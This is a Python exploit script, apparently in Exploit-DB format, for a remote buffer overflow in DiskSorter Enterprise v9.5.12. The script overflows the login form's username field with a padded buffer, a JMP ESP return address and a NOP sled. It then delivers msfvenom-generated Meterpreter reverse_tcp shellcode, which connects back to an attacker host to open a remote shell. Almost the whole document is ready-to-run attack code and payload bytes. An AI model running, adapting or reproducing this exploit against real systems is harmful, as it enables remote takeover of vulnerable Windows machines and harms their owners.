#!/usr/bin/python3

#Exploit Titile: DiskSorter Enterprise v9.5.12 - 'POST' Remote buffer overflow 
#Date: 2024-8-9
#Exploit Author: Ajay Justin
#Author email: mrc6178@gmail.com
#Vendor Homepage: https://www.disksorter.com
#Software Link: http://www.disksorter.com/setups/disksorterent_setup_v9.5.12.exe
#Version: 9.5.12
#Tested on: Windows 10 x86

import requests
from struct import pack

#Bad chars \x00\x0a\x0d\x09\x20
# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.107 LPORT=443 -b"\x00\x0a\x0d\x09\x20" -f py -v shellcode
#Payload size: 381 bytes
#Final size of py file: 2136 bytes

shellcode =  b""
shellcode += b"\xd9\xc4\xb8\xc0\x4b\x9c\xa9\xd9\x74\x24\xf4"
shellcode += b"\x5a\x33\xc9\xb1\x59\x31\x42\x19\x83\xea\xfc"
shellcode += b"\x03\x42\x15\x22\xbe\x60\x41\x2d\x41\x99\x92"
shellcode += b"\x51\x73\x4b\xf6\x1a\x21\x5b\x7c\x4e\xca\x12"
shellcode += b"\x67\xe5\x80\x30\xe3\x8b\x0c\x36\x44\x21\x6b"
shellcode += b"\x79\x55\x84\xb3\xd5\x95\x87\x4f\x24\xca\x67"
shellcode += b"\x71\xe7\x1f\x66\xb6\xb1\x6a\x87\x6a\x15\x1e"
shellcode += b"\x05\x9b\x12\x62\x95\x9a\xf4\xe8\xa5\xe4\x71"
shellcode += b"\x2e\x51\x59\x7b\x7f\x12\x39\x5b\x7e\xf7\x31"
shellcode += b"\xd3\x98\xa7\xc0\x2d\xec\x7b\x82\x26\x39\x08"
shellcode += b"\x15\xef\x73\xf1\x27\xcf\xb5\xc2\x45\x63\x34"
shellcode += b"\x1b\x6d\x9b\x42\x57\x8d\x26\x55\xac\xef\xfc"
shellcode += b"\xd0\x32\x57\x76\x42\x96\x69\x5b\x15\x5d\x65"
shellcode += b"\x10\x51\x39\x6a\xa7\xb6\x32\x96\x2c\x39\x94"
shellcode += b"\x1e\x76\x1e\x30\x7a\x2c\x3f\x61\x26\x83\x40"
shellcode += b"\x71\x8e\x7c\xe5\xfa\x3d\x6a\x99\x03\xbe\x93"
shellcode += b"\xc7\x93\x72\x5e\xf8\x63\x1d\xe9\x8b\x51\x82"
shellcode += b"\x41\x04\xd9\x4b\x4c\xd3\x68\x5b\x6f\x0b\xd2"
shellcode += b"\x0c\x91\xac\x22\x04\x56\xf8\x72\x3e\x7f\x81"
shellcode += b"\x19\xbe\x80\x54\xb7\xb4\x16\x97\xef\xf1\x8d"
shellcode += b"\x7f\xed\x01\x53\x3b\x78\xe7\x03\x6b\x2a\xb8"
shellcode += b"\xe3\xdb\x8a\x68\x8c\x31\x05\x56\xac\x39\xcc"
shellcode += b"\xff\x47\xd6\xb8\xa8\xff\x4f\xe1\x23\x61\x8f"
shellcode += b"\x3c\x4e\xa1\x1b\xb4\xae\x6c\xec\xbd\xbc\x99"
shellcode += b"\x8b\x3d\x3d\x5a\x3e\x3d\x57\x5e\xe8\x6a\xcf"
shellcode += b"\x5c\xcd\x5c\x50\x9e\x38\xdf\x97\x60\xbd\xe9"
shellcode += b"\xec\x57\x2b\x55\x9b\x97\xbb\x55\x5b\xce\xd1"
shellcode += b"\x55\x33\xb6\x81\x06\x26\xb9\x1f\x3b\xfb\x2c"
shellcode += b"\xa0\x6d\xaf\xe7\xc8\x93\x96\xc0\x56\x6c\xfd"
shellcode += b"\x52\x90\x92\x83\x7c\x39\xfa\x7b\x3d\xb9\xfa"
shellcode += b"\x11\xbd\xe9\x92\xee\x92\x06\x52\x0e\x39\x4f"
shellcode += b"\xfa\x85\xac\x3d\x9b\x9a\xe4\xe0\x05\x9a\x0b"
shellcode += b"\x39\xb6\xe1\x64\xbe\x37\x16\x6d\xdb\x38\x16"
shellcode += b"\x91\xdd\x05\xc0\xa8\xab\x48\xd0\x8e\xa4\xff"
shellcode += b"\x75\xa6\x2e\xff\x2a\xb8\x7a"

#Buffer Overflow

buffer = b"\x41"*768
buffer += pack("<L",0x10142a2c)  	#10142a2c jmp esp (libspp.dll)
#NOPS
buffer += b"\x90"*24
#SHELLCODE
buffer += shellcode
#JUNK
buffer += b"\x41"*(2000 - len(buffer))
#Post Request
try:
	print("[+]Evil url post request preparing")
	print("[+]press ctr+c after few seconds")
	r = requests.post("http://192.168.56.102/login",data={'username':buffer,'password':'aaa'})
	print("[+]status code {}".format(r))
except KeyboardInterrupt as a:
	print("[+]Exiting payload sended successfully")
	

